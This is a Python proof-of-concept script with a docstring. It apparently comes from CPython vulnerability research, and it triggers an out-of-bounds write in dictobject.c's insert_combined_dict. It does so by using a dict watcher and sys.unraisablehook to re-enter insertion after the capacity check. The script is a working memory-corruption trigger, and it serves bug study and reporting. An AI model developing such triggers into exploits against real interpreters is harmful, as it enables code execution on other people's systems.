"""insert_combined_dict: stale `dk_usable <= 0` check across a Python-running call.

Objects/dictobject.c:1898-1939 -- the SIBLING of the insert_split_key shape,
found by reading, not by a scanner.

    if (mp->ma_keys->dk_usable <= 0) {          # :1910  capacity checked HERE
        if (insertion_resize(mp, 1) < 0) { return -1; }
    }
    _PyDict_NotifyEvent(PyDict_EVENT_ADDED, mp, key, value);   # :1917 RUNS PYTHON
    ...
    Py_ssize_t hashpos = find_empty_slot(mp->ma_keys, hash);   # :1920
    dictkeys_set_index(mp->ma_keys, hashpos, mp->ma_keys->dk_nentries);
    ep = &DK_UNICODE_ENTRIES(mp->ma_keys)[mp->ma_keys->dk_nentries];  # :1925 WRITE
    STORE_KEY(ep, key); STORE_VALUE(ep, value);
    STORE_KEYS_USABLE(mp->ma_keys, mp->ma_keys->dk_usable - 1);       # :1936
    assert(mp->ma_keys->dk_usable >= 0);                              # :1938

`_PyDict_NotifyEvent` -> `_PyDict_SendEvent` (dictobject.c:8298).  When a dict
watcher callback returns -1 that runs `PyErr_FormatUnraisable` (:8314) ->
`sys.unraisablehook` == arbitrary Python.

For a COMBINED table the invariant is exact: dk_usable == 0 means
dk_nentries == USABLE_FRACTION(DK_SIZE(keys)), i.e. every entry slot is taken.
A SINGLE re-entrant burst that consumes the remaining slots makes the outer
frame write at `DK_UNICODE_ENTRIES(keys)[nentries]` past the end of the entries
array.  No nesting is needed -- one re-entry is enough.

Usage:  python insert_combined_dict_stale_usable_overflow.py [burst]
"""

import sys

import _testcapi


BURST = int(sys.argv[1]) if len(sys.argv) > 1 else 4096


def main():
    victim = {}
    # Grow into a combined table with a real entries array.
    for i in range(64):
        victim["seed_%d" % i] = i
    print("[main] seeded, len=%d" % len(victim), flush=True)

    fired = []

    def hook(unraisable):
        # Runs from inside _PyDict_NotifyEvent, i.e. from inside
        # insert_combined_dict AFTER its dk_usable check and BEFORE its write.
        if fired:
            return
        fired.append(1)
        # Consume every remaining usable slot.  Each of these is itself a
        # correctly-bounded insertion; the last one drives dk_usable to 0 and
        # dk_nentries to USABLE_FRACTION(DK_SIZE).  The suspended outer frame
        # then writes one past that.
        for i in range(BURST):
            victim["reentrant_%d" % i] = i

    sys.unraisablehook = hook

    # kind=1 -> dict_watch_callback_error: returns -1 with an exception set,
    # forcing dictobject.c:8314 PyErr_FormatUnraisable -> sys.unraisablehook.
    wid = _testcapi.add_dict_watcher(1)
    _testcapi.watch_dict(wid, victim)

    print("[main] armed; triggering", flush=True)
    victim["trigger"] = 1
    print("[main] returned; len=%d" % len(victim), flush=True)

    _testcapi.unwatch_dict(wid, victim)
    sys.unraisablehook = sys.__unraisablehook__

    # Walk the table so a corrupted entries array is also read.
    print("[main] walk sum=%d" % sum(v for v in victim.values()
                                     if isinstance(v, int)), flush=True)
    print("[main] survived", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
